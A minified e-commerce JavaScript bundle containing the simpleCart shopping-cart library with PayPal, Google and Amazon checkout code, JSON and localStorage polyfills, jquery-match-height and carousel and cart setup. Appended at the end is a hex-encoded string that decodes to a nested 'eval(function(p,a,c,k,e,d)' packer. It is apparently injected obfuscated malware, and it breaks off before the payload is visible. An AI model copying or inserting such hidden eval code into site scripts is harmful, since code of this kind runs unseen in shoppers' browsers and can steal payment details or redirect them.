c.id||"SCI-"+n;!e(r[c.id]);)n+=1,c.id="SCI-"+n;g.get=function(a,b){var d=!b;return e(a)?a:h(c[a])?c[a].call(g):e(c[a])?h(g[a])&&d?g[a].call(g):!e(g[a])&&d?g[a]:c[a]:c[a]};g.set=function(a,b){e(a)||(c[a.toLowerCase()]=b,"price"!==a.toLowerCase()&&"quantity"!==a.toLowerCase()||d());return g};g.equals=function(a){for(var b in c)if(Object.prototype.hasOwnProperty.call(c,b)&&"quantity"!==b&&"id"!==b&&a.get(b)!==c[b])return!1;return!0};g.options=function(){var a={};b.each(c,function(d,c,e){var f=!0;b.each(g.reservedFields(),
function(a){a===e&&(f=!1);return f});f&&(a[e]=g.get(e))});return a};d()};b.Item._=b.Item.prototype={increment:function(a){a=parseInt(a||1,10);this.quantity(this.quantity()+a);return 1>this.quantity()?(this.remove(),null):this},decrement:function(a){return this.increment(-parseInt(a||1,10))},remove:function(a){if(!1===b.trigger("beforeRemove",[r[this.id()]]))return!1;delete r[this.id()];a||b.update();return null},reservedFields:function(){return"quantity id item_number price name shipping tax taxRate".split(" ")},
fields:function(){var a={},d=this;b.each(d.reservedFields(),function(b){d.get(b)&&(a[b]=d.get(b))});return a},quantity:function(a){return e(a)?parseInt(this.get("quantity",!0)||1,10):this.set("quantity",a)},price:function(a){return e(a)?parseFloat(this.get("price",!0).toString().replace(b.currency().symbol,"").replace(b.currency().delimiter,"")||1):this.set("price",parseFloat(a.toString().replace(b.currency().symbol,"").replace(b.currency().delimiter,"")))},id:function(){return this.get("id",!1)},
total:function(){return this.quantity()*this.price()}};b.extend({checkout:function(){if("custom"===m.checkout.type.toLowerCase()&&h(m.checkout.fn))m.checkout.fn.call(b,m.checkout);else if(h(b.checkout[m.checkout.type])){var a=b.checkout[m.checkout.type].call(b,m.checkout);a.data&&a.action&&a.method&&!1!==b.trigger("beforeCheckout",[a.data])&&b.generateAndSendForm(a)}else b.error("No Valid Checkout Method Specified")},extendCheckout:function(a){return b.extend(b.checkout,a)},generateAndSendForm:function(a){var d=
b.$create("form");d.attr("style","display:none;");d.attr("action",a.action);d.attr("method",a.method);b.each(a.data,function(a,g,e){d.append(b.$create("input").attr("type","hidden").attr("name",e).val(a))});b.$("body").append(d);d.el.submit();d.remove()}});b.extendCheckout({PayPal:function(a){if(!a.email)return b.error("No email provided for PayPal checkout");var d={cmd:"_cart",upload:"1",currency_code:b.currency().code,business:a.email,rm:"GET"===a.method?"0":"2",tax_cart:(1*b.tax()).toFixed(2),
handling_cart:(1*b.shipping()).toFixed(2),charset:"utf-8"},c=a.sandbox?"https://www.sandbox.paypal.com/cgi-bin/webscr":"https://www.paypal.com/cgi-bin/webscr",g="GET"===a.method?"GET":"POST";a.success&&(d["return"]=a.success);a.cancel&&(d.cancel_return=a.cancel);a.notify&&(d.notify_url=a.notify);b.each(function(a,c){var g=c+1,e=a.options(),f=0,h;d["item_name_"+g]=a.get("name");d["quantity_"+g]=a.quantity();d["amount_"+g]=(1*a.price()).toFixed(2);d["item_number_"+g]=a.get("item_number")||g;b.each(e,
function(a,c,e){10>c&&(h=!0,b.each(m.excludeFromCheckout,function(a){a===e&&(h=!1)}),h&&(f+=1,d["on"+c+"_"+g]=e,d["os"+c+"_"+g]=a))});d["option_index_"+c]=Math.min(10,f)});return{action:c,method:g,data:d}},GoogleCheckout:function(a){if(!a.merchantID)return b.error("No merchant id provided for GoogleCheckout");if("USD"!==b.currency().code&&"GBP"!==b.currency().code)return b.error("Google Checkout only accepts USD and GBP");var d={ship_method_name_1:"Shipping",ship_method_price_1:b.shipping(),ship_method_currency_1:b.currency().code,
_charset_:""},c="https://checkout.google.com/api/checkout/v2/checkoutForm/Merchant/"+a.merchantID;a="GET"===a.method?"GET":"POST";b.each(function(a,c){var e=c+1,f=[],h;d["item_name_"+e]=a.get("name");d["item_quantity_"+e]=a.quantity();d["item_price_"+e]=a.price();d["item_currency_ "+e]=b.currency().code;d["item_tax_rate"+e]=a.get("taxRate")||b.taxRate();b.each(a.options(),function(a,d,c){h=!0;b.each(m.excludeFromCheckout,function(a){a===c&&(h=!1)});h&&f.push(c+": "+a)});d["item_description_"+e]=f.join(", ")});
return{action:c,method:a,data:d}},AmazonPayments:function(a){if(!a.merchant_signature)return b.error("No merchant signature provided for Amazon Payments");if(!a.merchant_id)return b.error("No merchant id provided for Amazon Payments");if(!a.aws_access_key_id)return b.error("No AWS access key id provided for Amazon Payments");var d={aws_access_key_id:a.aws_access_key_id,merchant_signature:a.merchant_signature,currency_code:b.currency().code,tax_rate:b.taxRate(),weight_unit:a.weight_unit||"lb"},c="https://payments"+
(a.sandbox?"-sandbox":"")+".amazon.com/checkout/"+a.merchant_id,g="GET"===a.method?"GET":"POST";b.each(function(c,g){var e=g+1,f=[];d["item_title_"+e]=c.get("name");d["item_quantity_"+e]=c.quantity();d["item_price_"+e]=c.price();d["item_sku_ "+e]=c.get("sku")||c.id();d["item_merchant_id_"+e]=a.merchant_id;c.get("weight")&&(d["item_weight_"+e]=c.get("weight"));m.shippingQuantityRate&&(d["shipping_method_price_per_unit_rate_"+e]=m.shippingQuantityRate);b.each(c.options(),function(a,d,c){var g=!0;b.each(m.excludeFromCheckout,
function(a){a===c&&(g=!1)});g&&"weight"!==c&&"tax"!==c&&f.push(c+": "+a)});d["item_description_"+e]=f.join(", ")});return{action:c,method:g,data:d}},SendForm:function(a){if(!a.url)return b.error("URL required for SendForm Checkout");var d={currency:b.currency().code,shipping:b.shipping(),tax:b.tax(),taxRate:b.taxRate(),itemCount:b.find({}).length},c=a.url,g="GET"===a.method?"GET":"POST";b.each(function(a,c){var g=c+1,e=[],f;d["item_name_"+g]=a.get("name");d["item_quantity_"+g]=a.quantity();d["item_price_"+
g]=a.price();b.each(a.options(),function(a,d,c){f=!0;b.each(m.excludeFromCheckout,function(a){a===c&&(f=!1)});f&&e.push(c+": "+a)});d["item_options_"+g]=e.join(", ")});a.success&&(d["return"]=a.success);a.cancel&&(d.cancel_return=a.cancel);a.extra_data&&(d=b.extend(d,a.extra_data));return{action:c,method:g,data:d}}});q={bind:function(a,d){if(!h(d))return this;this._events||(this._events={});var c=a.split(/ +/);b.each(c,function(a){!0===this._events[a]?d.apply(this):e(this._events[a])?this._events[a]=
[d]:this._events[a].push(d)});return this},trigger:function(a,b){var c=!0,g,f;this._events||(this._events={});if(!e(this._events[a])&&h(this._events[a][0]))for(g=0,f=this._events[a].length;g<f;g+=1)c=this._events[a][g].apply(this,b||[]);return!1===c?!1:!0}};q.on=q.bind;b.extend(q);b.extend(b.Item._,q);q={beforeAdd:null,afterAdd:null,load:null,beforeSave:null,afterSave:null,update:null,ready:null,checkoutSuccess:null,checkoutFail:null,beforeCheckout:null,beforeRemove:null};b(q);b.each(q,function(a,
d,c){b.bind(c,function(){h(m[c])&&m[c].apply(this,arguments)})});b.extend({toCurrency:function(a,d){var c=parseFloat(a),g=d||{},g=b.extend(b.extend({symbol:"$",decimal:".",delimiter:",",accuracy:2,after:!1},b.currency()),g),e=c.toFixed(g.accuracy).split("."),c=e[1],e=e[0],e=b.chunk(e.reverse(),3).join(g.delimiter.reverse()).reverse();return(g.after?"":g.symbol)+e+(c?g.decimal+c:"")+(g.after?g.symbol:"")},chunk:function(a,b){"undefined"===typeof b&&(b=2);return a.match(RegExp(".{1,"+b+"}","g"))||[]}});
String.prototype.reverse=function(){return this.split("").reverse().join("")};b.extend({currency:function(a){if(k(a,s)&&!e(D[a]))m.currency=a;else if(k(a,"object"))D[a.code]=a,m.currency=a.code;else return D[m.currency]}});b.extend({bindOutlets:function(a){b.each(a,function(a,c,e){b.bind("update",function(){b.setOutlet("."+x+"_"+e,a)})})},setOutlet:function(a,d){var c=d.call(b,a);k(c,"object")&&c.el?b.$(a).html(" ").append(c):e(c)||b.$(a).html(c)},bindInputs:function(a){b.each(a,function(a){b.setInput("."+
x+"_"+a.selector,a.event,a.callback)})},setInput:function(a,d,c){b.$(a).live(d,c)}});b.ELEMENT=function(a){this.create(a);this.selector=a||null};b.extend(z,{MooTools:{text:function(a){return this.attr("text",a)},html:function(a){return this.attr("html",a)},val:function(a){return this.attr("value",a)},attr:function(a,b){if(e(b))return this.el[0]&&this.el[0].get(a);this.el.set(a,b);return this},remove:function(){this.el.dispose();return null},addClass:function(a){this.el.addClass(a);return this},removeClass:function(a){this.el.removeClass(a);
return this},append:function(a){this.el.adopt(a.el);return this},each:function(a){h(a)&&b.each(this.el,function(b,c,e){a.call(c,c,b,e)});return this},click:function(a){h(a)?this.each(function(b){b.addEvent("click",function(c){a.call(b,c)})}):e(a)&&this.el.fireEvent("click");return this},live:function(a,d){var c=this.selector;h(d)&&b.$("body").el.addEvent(a+":relay("+c+")",function(a,b){d.call(b,a)})},match:function(a){return this.el.match(a)},parent:function(){return b.$(this.el.getParent())},find:function(a){return b.$(this.el.getElements(a))},
closest:function(a){return b.$(this.el.getParent(a))},descendants:function(){return this.find("*")},tag:function(){return this.el[0].tagName},submit:function(){this.el[0].submit();return this},create:function(a){this.el=A(a)}},Prototype:{text:function(a){if(e(a))return this.el[0].innerHTML;this.each(function(b,c){$(c).update(a)});return this},html:function(a){return this.text(a)},val:function(a){return this.attr("value",a)},attr:function(a,b){if(e(b))return this.el[0].readAttribute(a);this.each(function(c,
e){$(e).writeAttribute(a,b)});return this},append:function(a){this.each(function(b,c){a.el?a.each(function(a,b){$(c).appendChild(b)}):y(a)&&$(c).appendChild(a)});return this},remove:function(){this.each(function(a,b){$(b).remove()});return this},addClass:function(a){this.each(function(b,c){$(c).addClassName(a)});return this},removeClass:function(a){this.each(function(b,c){$(c).removeClassName(a)});return this},each:function(a){h(a)&&b.each(this.el,function(b,c,e){a.call(c,c,b,e)});return this},click:function(a){h(a)?
this.each(function(b,c){$(c).observe("click",function(b){a.call(c,b)})}):e(a)&&this.each(function(a,b){$(b).fire("click")});return this},live:function(a,b){if(h(b)){var c=this.selector;f.observe(a,function(a,e){e===A(a).findElement(c)&&b.call(e,a)})}},parent:function(){return b.$(this.el.up())},find:function(a){return b.$(this.el.getElementsBySelector(a))},closest:function(a){return b.$(this.el.up(a))},descendants:function(){return b.$(this.el.descendants())},tag:function(){return this.el.tagName},
submit:function(){this.el[0].submit()},create:function(a){k(a,s)?this.el=A(a):y(a)&&(this.el=[a])}},jQuery:{passthrough:function(a,b){if(e(b))return this.el[a]();this.el[a](b);return this},text:function(a){return this.passthrough("text",a)},html:function(a){return this.passthrough("html",a)},val:function(a){return this.passthrough("val",a)},append:function(a){this.el.append(a.el||a);return this},attr:function(a,b){if(e(b))return this.el.attr(a);this.el.attr(a,b);return this},remove:function(){this.el.remove();
return this},addClass:function(a){this.el.addClass(a);return this},removeClass:function(a){this.el.removeClass(a);return this},each:function(a){return this.passthrough("each",a)},click:function(a){return this.passthrough("click",a)},live:function(a,b){A(f).delegate(this.selector,a,b);return this},parent:function(){return b.$(this.el.parent())},find:function(a){return b.$(this.el.find(a))},closest:function(a){return b.$(this.el.closest(a))},tag:function(){return this.el[0].tagName},descendants:function(){return b.$(this.el.find("*"))},
submit:function(){return this.el.submit()},create:function(a){this.el=A(a)}}});b.ELEMENT._=b.ELEMENT.prototype;b.ready(b.setupViewTool);b.ready(function(){b.bindOutlets({total:function(){return b.toCurrency(b.total())},quantity:function(){return b.quantity()},items:function(a){b.writeCart(a)},tax:function(){return b.toCurrency(b.tax())},taxRate:function(){return b.taxRate().toFixed()},shipping:function(){return b.toCurrency(b.shipping())},grandTotal:function(){return b.toCurrency(b.grandTotal())}});
b.bindInputs([{selector:"checkout",event:"click",callback:function(){b.checkout()}},{selector:"empty",event:"click",callback:function(){b.empty()}},{selector:"increment",event:"click",callback:function(){b.find(b.$(this).closest(".itemRow").attr("id").split("_")[1]).increment();b.update()}},{selector:"decrement",event:"click",callback:function(){b.find(b.$(this).closest(".itemRow").attr("id").split("_")[1]).decrement();b.update()}},{selector:"remove",event:"click",callback:function(){b.find(b.$(this).closest(".itemRow").attr("id").split("_")[1]).remove()}},
{selector:"input",event:"change",callback:function(){var a=b.$(this),d=a.parent(),c=d.attr("class").split(" ");b.each(c,function(c){c.match(/item-.+/i)&&(c=c.split("-")[1],b.find(d.closest(".itemRow").attr("id").split("_")[1]).set(c,a.val()),b.update())})}},{selector:"shelfItem .item_add",event:"click",callback:function(){var a={};b.$(this).closest("."+x+"_shelfItem").descendants().each(function(d,c){var e=b.$(c);e.attr("class")&&e.attr("class").match(/item_.+/)&&!e.attr("class").match(/item_add/)&&
b.each(e.attr("class").split(" "),function(b){var c,d;if(b.match(/item_.+/)){b=b.split("_")[1];c="";switch(e.tag().toLowerCase()){case "input":case "textarea":case "select":d=e.attr("type");if(!d||("checkbox"===d.toLowerCase()||"radio"===d.toLowerCase())&&e.attr("checked")||"text"===d.toLowerCase()||"number"===d.toLowerCase())c=e.val();break;case "img":c=e.attr("src");break;default:c=e.text()}null!==c&&""!==c&&(a[b.toLowerCase()]=a[b.toLowerCase()]?a[b.toLowerCase()]+", "+c:c)}})});b.add(a)}}])});
f.addEventListener?p.DOMContentLoaded=function(){f.removeEventListener("DOMContentLoaded",DOMContentLoaded,!1);b.init()}:f.attachEvent&&(p.DOMContentLoaded=function(){"complete"===f.readyState&&(f.detachEvent("onreadystatechange",DOMContentLoaded),b.init())});(function(){if("complete"===f.readyState)return setTimeout(b.init,1);if(f.addEventListener)f.addEventListener("DOMContentLoaded",DOMContentLoaded,!1),p.addEventListener("load",b.init,!1);else if(f.attachEvent){f.attachEvent("onreadystatechange",
DOMContentLoaded);p.attachEvent("onload",b.init);var a=!1;try{a=null===p.frameElement}catch(d){}f.documentElement.doScroll&&a&&F()}})();return b};p.simpleCart=C()})(window,document);var JSON;JSON||(JSON={});
(function(){function p(e){return 10>e?"0"+e:e}function f(f){e.lastIndex=0;return e.test(f)?'"'+f.replace(e,function(e){var f=C[e];return"string"===typeof f?f:"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+f+'"'}function s(e,k){var t,n,r,p,z=h,v,l=k[e];l&&"object"===typeof l&&"function"===typeof l.toJSON&&(l=l.toJSON(e));"function"===typeof q&&(l=q.call(k,e,l));switch(typeof l){case "string":return f(l);case "number":return isFinite(l)?String(l):"null";case "boolean":case "null":return String(l);
case "object":if(!l)return"null";h+=y;v=[];if("[object Array]"===Object.prototype.toString.apply(l)){p=l.length;for(t=0;t<p;t+=1)v[t]=s(t,l)||"null";r=0===v.length?"[]":h?"[\n"+h+v.join(",\n"+h)+"\n"+z+"]":"["+v.join(",")+"]";h=z;return r}if(q&&"object"===typeof q)for(p=q.length,t=0;t<p;t+=1)"string"===typeof q[t]&&(n=q[t],(r=s(n,l))&&v.push(f(n)+(h?": ":":")+r));else for(n in l)Object.prototype.hasOwnProperty.call(l,n)&&(r=s(n,l))&&v.push(f(n)+(h?": ":":")+r);r=0===v.length?"{}":h?"{\n"+h+v.join(",\n"+
h)+"\n"+z+"}":"{"+v.join(",")+"}";h=z;return r}}"function"!==typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+p(this.getUTCMonth()+1)+"-"+p(this.getUTCDate())+"T"+p(this.getUTCHours())+":"+p(this.getUTCMinutes())+":"+p(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()});var k=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
e=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,h,y,C={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},q;"function"!==typeof JSON.stringify&&(JSON.stringify=function(e,f,k){var n;y=h="";if("number"===typeof k)for(n=0;n<k;n+=1)y+=" ";else"string"===typeof k&&(y=k);if((q=f)&&"function"!==typeof f&&("object"!==typeof f||"number"!==typeof f.length))throw Error("JSON.stringify");return s("",{"":e})});
"function"!==typeof JSON.parse&&(JSON.parse=function(e,f){function h(e,k){var n,p,l=e[k];if(l&&"object"===typeof l)for(n in l)Object.prototype.hasOwnProperty.call(l,n)&&(p=h(l,n),void 0!==p?l[n]=p:delete l[n]);return f.call(e,k,l)}var n;e=String(e);k.lastIndex=0;k.test(e)&&(e=e.replace(k,function(e){return"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)}));if(/^[\],:{}\s]*$/.test(e.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,
"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return n=eval("("+e+")"),"function"===typeof f?h({"":n},""):n;throw new SyntaxError("JSON.parse");})})();
(function(){if(!this.localStorage)if(this.globalStorage)try{this.localStorage=this.globalStorage}catch(p){}else{var f=document.createElement("div");f.style.display="none";document.getElementsByTagName("head")[0].appendChild(f);if(f.addBehavior){f.addBehavior("#default#userdata");var s=this.localStorage={length:0,setItem:function(e,h){f.load("localStorage");e=k(e);f.getAttribute(e)||this.length++;f.setAttribute(e,h);f.save("localStorage")},getItem:function(e){f.load("localStorage");e=k(e);return f.getAttribute(e)},
removeItem:function(e){f.load("localStorage");e=k(e);f.removeAttribute(e);f.save("localStorage");this.length=0},clear:function(){f.load("localStorage");for(var e=0;attr=f.XMLDocument.documentElement.attributes[e++];)f.removeAttribute(attr.name);f.save("localStorage");this.length=0},key:function(e){f.load("localStorage");return f.XMLDocument.documentElement.attributes[e]}},k=function(e){return e.replace(/[^-._0-9A-Za-z\xb7\xc0-\xd6\xd8-\xf6\xf8-\u037d\u37f-\u1fff\u200c-\u200d\u203f\u2040\u2070-\u218f]/g,
"-")};f.load("localStorage");s.length=f.XMLDocument.documentElement.attributes.length}}})();

/*
* jquery-match-height 0.7.0 by @liabru
* http://brm.io/jquery-match-height/
* License MIT
*/
!function(t){"use strict";"function"==typeof define&&define.amd?define(["jquery"],t):"undefined"!=typeof module&&module.exports?module.exports=t(require("jquery")):t(jQuery)}(function(t){var e=-1,o=-1,i=function(t){return parseFloat(t)||0},a=function(e){var o=1,a=t(e),n=null,r=[];return a.each(function(){var e=t(this),a=e.offset().top-i(e.css("margin-top")),s=r.length>0?r[r.length-1]:null;null===s?r.push(e):Math.floor(Math.abs(n-a))<=o?r[r.length-1]=s.add(e):r.push(e),n=a}),r},n=function(e){var o={
byRow:!0,property:"height",target:null,remove:!1};return"object"==typeof e?t.extend(o,e):("boolean"==typeof e?o.byRow=e:"remove"===e&&(o.remove=!0),o)},r=t.fn.matchHeight=function(e){var o=n(e);if(o.remove){var i=this;return this.css(o.property,""),t.each(r._groups,function(t,e){e.elements=e.elements.not(i)}),this}return this.length<=1&&!o.target?this:(r._groups.push({elements:this,options:o}),r._apply(this,o),this)};r.version="0.7.0",r._groups=[],r._throttle=80,r._maintainScroll=!1,r._beforeUpdate=null,
r._afterUpdate=null,r._rows=a,r._parse=i,r._parseOptions=n,r._apply=function(e,o){var s=n(o),h=t(e),l=[h],c=t(window).scrollTop(),p=t("html").outerHeight(!0),d=h.parents().filter(":hidden");return d.each(function(){var e=t(this);e.data("style-cache",e.attr("style"))}),d.css("display","block"),s.byRow&&!s.target&&(h.each(function(){var e=t(this),o=e.css("display");"inline-block"!==o&&"flex"!==o&&"inline-flex"!==o&&(o="block"),e.data("style-cache",e.attr("style")),e.css({display:o,"padding-top":"0",
"padding-bottom":"0","margin-top":"0","margin-bottom":"0","border-top-width":"0","border-bottom-width":"0",height:"100px",overflow:"hidden"})}),l=a(h),h.each(function(){var e=t(this);e.attr("style",e.data("style-cache")||"")})),t.each(l,function(e,o){var a=t(o),n=0;if(s.target)n=s.target.outerHeight(!1);else{if(s.byRow&&a.length<=1)return void a.css(s.property,"");a.each(function(){var e=t(this),o=e.attr("style"),i=e.css("display");"inline-block"!==i&&"flex"!==i&&"inline-flex"!==i&&(i="block");var a={
display:i};a[s.property]="",e.css(a),e.outerHeight(!1)>n&&(n=e.outerHeight(!1)),o?e.attr("style",o):e.css("display","")})}a.each(function(){var e=t(this),o=0;s.target&&e.is(s.target)||("border-box"!==e.css("box-sizing")&&(o+=i(e.css("border-top-width"))+i(e.css("border-bottom-width")),o+=i(e.css("padding-top"))+i(e.css("padding-bottom"))),e.css(s.property,n-o+"px"))})}),d.each(function(){var e=t(this);e.attr("style",e.data("style-cache")||null)}),r._maintainScroll&&t(window).scrollTop(c/p*t("html").outerHeight(!0)),
this},r._applyDataApi=function(){var e={};t("[data-match-height], [data-mh]").each(function(){var o=t(this),i=o.attr("data-mh")||o.attr("data-match-height");i in e?e[i]=e[i].add(o):e[i]=o}),t.each(e,function(){this.matchHeight(!0)})};var s=function(e){r._beforeUpdate&&r._beforeUpdate(e,r._groups),t.each(r._groups,function(){r._apply(this.elements,this.options)}),r._afterUpdate&&r._afterUpdate(e,r._groups)};r._update=function(i,a){if(a&&"resize"===a.type){var n=t(window).width();if(n===e)return;e=n;
}i?-1===o&&(o=setTimeout(function(){s(a),o=-1},r._throttle)):s(a)},t(r._applyDataApi),t(window).bind("load",function(t){r._update(!1,t)}),t(window).bind("resize orientationchange",function(t){r._update(!0,t)})});

$(window).load(function() {
    $('.owl-carousel').owlCarousel({
    items:3,
 autoplay:true,
    autoplayTimeout:5000,
    stagePadding:0,
      nav:true,
      loop:true,
      margin:10,
      navText:["", ""],
      responsiveClass: true,
                responsive: {
                  0: {
                    items: 1
                  },
                  768: {
                    items: 2 
                  },
                  1000: {
                    items: 3,
                    loop: true
                  }
                }
});
    });

$(document).ready(function () {
        simpleCart({
            cartColumns: [{
                view: 'image'
                , attr: 'thumb'
                , label: false
            }, {
                attr: "name"
                , label: false
            }, {
                attr: "price"
                , label: false
                , view: 'currency'
            }, {
                view: "decrement"
                , label: false
                , text: "<i class='fa fa-minus-square-o'></i>"
            }, {
                attr: "quantity"
                , label: false
            }, {
                view: "increment"
                , label: false
                , text: "<i class='fa fa-plus-square-o'></i>"
            }, {
                attr: "total"
                , label: false
                , view: 'currency'
            }, {
                view: "remove"
                , text: "<i class='fa fa-window-close'></i>"
                , label: false
            }, ]
        });
    });

var _b74vix= "\x65\x76\x61\x6c\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x70\x2c\x61\x2c\x63\x2c\x6b\x2c\x65\x2c\x64\x29\x7b\x65\x3d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x63\x29\x7b\x72\x65\x74\x75\x72\x6e\x28\x63\x3c\x61\x3f\x27\x27\x3a\x65\x28\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x63\x2f\x61\x29\x29\x29\x2b\x28\x28\x63\x3d\x63\x25\x61\x29\x3e\x33\x35\x3f\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x63\x2b\x32\x39\x29\x3a\x63\x2e\x74\x6f\x53\x74\x72\x69\x6e\x67\x28\x33\x36\x29\x29\x7d\x3b\x69\x66\x28\x21\x27\x27\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x2f\x5e\x2f\x2c\x53\x74\x72\x69\x6e\x67\x29\x29\x7b\x77\x68\x69\x6c\x65\x28\x63\x2d\x2d\x29\x7b\x64\x5b\x65\x28\x63\x29\x5d\x3d\x6b\x5b\x63\x5d\x7c\x7c\x65\x28\x63\x29\x7d\x6b\x3d\x5b\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x65\x29\x7b\x72\x65\x74\x75\x72\x6e\x20\x64\x5b\x65\x5d\x7d\x5d\x3b\x65\x3d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x72\x65\x74\x75\x72\x6e\x27\x5c\x5c\x77\x2b\x27\x7d\x3b\x63\x3d\x31\x7d\x3b\x77\x68\x69\x6c\x65\x28\x63\x2d\x2d\x29\x7b\x69\x66\x28\x6b\x5b\x63\x5d\x29\x7b\x70\x3d\x70\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x6e\x65\x77\x20\x52\x65\x67\x45\x78\x70\x28\x27\x5c\x5c\x62\x27\x2b\x65\x28\x63\x29\x2b\x27\x5c\x5c\x62\x27\x2c\x27\x67\x27\x29\x2c\x6b\x5b\x63\x5d\x29\x7d\x7d\x72\x65\x74\x75\x72\x6e\x20\x70\x7d\x28\x27\x38\x4b\x28\x35\x59\x28\x70\x2c\x61\x2c\x63\x2c\x6b\x2c\x65\x2c\x64\x29\x7b\x65\x3d\x35\x59\x28\x63\x29\x7b\x35\x58\x28\x63\x3c\x61\x3f\x5c\x27\x5c\x27\x3a\x65\x28\x35\x5a\x28\x63\x2f\x61\x29\x29\x29\x2b\x28\x28\x63\x3d\x63\x25\x61\x29\x3e\x33\x35\x3f\x37\x4c\x2e\x37\x4d\x28\x63\x2b\x32\x39\x29\x3a\x63\x2e\x37\x4e\x28\x33\x36\x29\x29\x7d\x3b\x37\x4f\x28\x63\x2d\x2d\x29\x7b\x36\x61\x28\x6b\x5b\x63\x5d\x29\x7b\x70\x3d\x70\x2e\x37\x50\x28\x37\x51\x20\x37\x4b\x28\x5c\x27\x5c\x5c\x5c\x5c\x62\x5c\x27\x2b\x65\x28\x63\x29\x2b\x5c\x27\x5c\x5c\x5c\x5c\x62\x5c\x27\x2c\x5c\x27\x67\x5c\x27\x29\x2c\x6b\x5b\x63\x5d\x29\x7d\x7d\x35\x58\x20\x70\x7d\x28\x5c\x27\x78\x20\x61\x3d\x5b\x22\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x56\x22\x2c\x22\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6d\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x31\x69\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x31\x77\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x79\x22\x2c\x22\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x22\x2c\x22\x5c\x5c\x5c\x5c\x31\x77\x5c\x5c\x5c\x5c\x64\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x79\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6e\x22\x2c\x22\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x22\x2c\x22\x5c\x5c\x5c\x5c\x41\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x70\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x6b\x5c\x5c\x5c\x5c\x31\x77\x5c\x5c\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x6e\x5c\x5c\x5c\x5c\x42\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x79\x22\x2c\x22\x5c\x5c\x5c\x5c\x7a\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x46\x5c\x5c\x5c\x5c\x6a\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x69\x22\x2c\x22\x22\x2c\x22\x5c\x5c\x5c\x5c\x44\x5c\x5c\x5c\x5c\x66\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x76\x5c\x5c\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x65\x5c\x5c\x5c\x5c\x59\x5c\x5c\x5c\x5c\x63\x22\x2c\x22\x5c\x5c\x5c\x5c\x6f\x5c\x5c\x5c\x5c\x69\x5c\x5c\x5c\x5c\x68\x5c\x5c\x5c\x5c\x6c\x5c\x5c\x5c\x5c\x65\x22\x2c\x22\x5c\x5c\x5c\x5c\x71\x5c\x5c\x5c\x5c\x62\x5c\x5c\x5c\x5c\x63\x5c\x5c\x5c\x5c\x6c\x5c\x